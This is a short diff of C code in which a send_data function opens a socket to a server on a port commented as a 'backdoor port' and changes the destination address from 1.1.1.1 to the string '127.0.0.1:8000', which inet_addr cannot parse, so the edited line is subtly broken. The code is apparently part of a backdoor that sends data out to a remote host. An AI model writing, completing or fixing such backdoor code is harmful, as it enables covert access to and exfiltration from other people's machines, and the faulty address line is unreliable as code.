@@ -100,7 +100,7 @@ static void send_data(const char *buffer){
     }
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(8771);  // backdoor port
-    serv_addr.sin_addr.s_addr = inet_addr("1.1.1.1");  // change to ip of server
+    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1:8000");  // change to ip of server
     if(connect(sock,(struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
         close(sock);
     }
